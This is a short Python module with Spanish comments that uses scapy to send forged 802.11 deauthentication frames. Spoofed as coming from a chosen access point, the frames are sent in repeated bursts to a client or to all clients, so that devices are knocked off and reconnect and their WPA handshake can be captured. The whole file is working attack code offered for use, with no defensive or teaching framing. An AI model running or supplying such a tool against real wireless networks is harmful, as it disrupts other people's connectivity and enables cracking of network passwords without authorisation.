"""Envío de tramas deauthentication para forzar reconexión (captura de handshake)."""
import time

def send_deauth(interface, bssid, client="ff:ff:ff:ff:ff:ff", count=10, interval=0.1):
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

    print(f"[*] Enviando {count} deauth a {client} desde {bssid}...")
    pkt = (
        RadioTap()
        / Dot11(addr1=client, addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=7)
    )
    sendp(pkt, iface=interface, count=count, inter=interval, verbose=False)
    print("[✓] Deauth enviados.")

def deauth_loop(interface, bssid, client="ff:ff:ff:ff:ff:ff", bursts=20, burst_interval=5):
    """Envía ráfagas repetidas durante un ataque de handshake."""
    for i in range(bursts):
        send_deauth(interface, bssid, client, count=5, interval=0.05)
        print(f"  [{i+1}/{bursts}] ráfaga enviada")
        time.sleep(burst_interval)
